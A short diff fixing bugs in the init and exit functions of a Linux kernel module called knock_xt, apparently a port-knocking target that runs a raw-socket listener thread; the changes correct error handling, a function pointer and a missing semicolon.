@@ -57,11 +57,11 @@ static int __init knock_xt_init(void) {
 	thread = NULL;
 
 	// Start kernel thread raw socket to listen for triggers
-	thread = kthread_run(listen, NULL, MODULE_NAME);
+	thread = kthread_run(&listen, NULL, MODULE_NAME);
 
 	if(IS_ERR(thread)) {
 		printk(KERN_INFO "[-] Unable to start child thread\n");
-		return ECHILD;
+		return PTR_ERR(thread);
 	}
 
 
@@ -76,14 +76,16 @@ static int __init knock_xt_init(void) {
 // Exit function to unregister target
 static void __exit knock_xt_exit(void) {
 
-	int err;
+	int err = 0;
 
 	if(thread==NULL) {
 		printk(KERN_INFO MODULE_NAME": no kernel thread to kill\n");
 	} else {
+		//lock_kernel();
 		err = kthread_stop(thread);
 		thread = NULL;
-		printk(KERN_INFO "[*] Stopped counterpart thread\n")
+		printk(KERN_INFO "[*] Stopped counterpart thread\n");
+		//unlock_kernel();
 	}
 
 
